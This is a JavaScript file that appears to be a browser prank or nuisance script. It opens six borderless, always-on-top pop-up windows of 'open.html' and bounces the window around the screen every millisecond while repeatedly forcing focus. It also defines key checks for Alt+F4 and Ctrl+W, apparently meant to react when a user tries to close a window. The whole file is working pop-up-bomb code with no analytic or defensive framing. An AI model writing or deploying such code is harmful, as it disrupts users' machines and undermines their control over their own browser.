var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

//opens a window
function openWindow(url) {
  aWindow = window.open(
    url,
    "_blank",
    "menubar=no,status=no,toolbar=no,resizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes,popup=yes"
  );
}

//opens 6 windows
function procreate() {
  openWindow("open.html");
  openWindow("open.html");
  openWindow("open.html");
  openWindow("open.html");
  openWindow("open.html");
  openWindow("open.html");
}

//returns true if alt+f4 is pressed
function altf4key(event) {
  if (event.altKey && event.code === 'F4') {
      return true;
  }
}

//returns true if ctrl+w is pressed
function ctrlwkey(event) {
  if (event.ctrlKey && event.code === 'KeyW') {
      return true;
  }
}

//sets xOff to a random number between -40 and -10 and brings the window to the front
function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}

//set xOff to a random number between -30 and 30
function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
  window.focus();
}

//sets yOff to a random number between -40 and -10
function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}

//set yOff to a random number between -30 and 30
function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
  window.focus();
}

function fOff() {
  flagRun = 0;
}

//moves the window
function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - 175) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - 100) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun == 1) {
    window.moveTo(xPos, yPos);
    setTimeout("playBall()", 1); //calls playBall() every 1 millisecond
  }
}
